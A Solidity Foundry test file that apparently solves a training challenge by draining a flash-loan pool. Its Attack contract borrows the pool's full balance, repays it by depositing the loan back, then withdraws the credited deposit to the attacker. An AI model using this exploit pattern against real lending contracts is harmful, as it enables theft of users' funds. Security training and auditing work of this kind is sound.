// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {
    SideEntranceLenderPool,
    IFlashLoanEtherReceiver
} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceTest is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Hacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log("Setup complete. Pool funded and ready.");
    }

    function testSideEntranceExploit() public {
        /**
         * EXPLOIT START
         */
        vm.startPrank(attacker);

        console.log("Pool ETH balance BEFORE:", address(sideEntranceLenderPool).balance);

        Attack attack_contract = new Attack(address(sideEntranceLenderPool));
        attack_contract.attack();

        console.log("Pool ETH balance AFTER:", address(sideEntranceLenderPool).balance);

        vm.stopPrank();
        /**
         * EXPLOIT END
         */

        validation();

        console.log("Exploit successful. Funds drained.");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract Attack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable sideEntrance;
    using Address for address payable;

    constructor(address _sideEntrance) {
        sideEntrance = SideEntranceLenderPool(_sideEntrance);
    }

    function execute() external payable {
        sideEntrance.deposit{value: msg.value}();
    }

    function attack() external {
        sideEntrance.flashLoan(address(sideEntrance).balance);
        sideEntrance.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}